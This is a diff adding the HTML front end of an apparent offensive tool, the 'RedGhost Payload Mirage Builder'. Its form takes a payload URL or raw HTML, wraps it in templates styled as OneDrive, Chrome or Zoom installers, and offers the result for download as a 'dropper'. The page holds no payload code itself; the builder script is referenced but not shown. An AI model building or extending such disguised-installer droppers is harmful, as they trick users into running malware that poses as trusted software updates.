@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>RedGhost Generator | DarkNode</title>
+  <link rel="stylesheet" href="css/redghost.css">
+</head>
+<body>
+  <div class="rg-container">
+    <h1>RedGhost Payload Mirage Builder</h1>
+    <form id="rg-form">
+      <label for="template">Choose Template:</label>
+      <select id="template">
+        <option value="onedrive">OneDrive Update</option>
+        <option value="chrome">Chrome Chrome-Style</option>
+        <option value="zoom">Zoom Installer</option>
+      </select>
+
+      <label for="payload">Payload URL / Raw HTML:</label>
+      <textarea id="payload" placeholder="https://your-server/payload.js" required></textarea>
+
+      <button type="submit">Generate & Download</button>
+    </form>
+
+    <div id="rg-output" class="hidden">
+      <p>Your dropper is ready. <a id="download-link" href="#">Download HTML</a></p>
+    </div>
+  </div>
+
+  <script src="js/builder.js"></script>
+</body>
+</html>
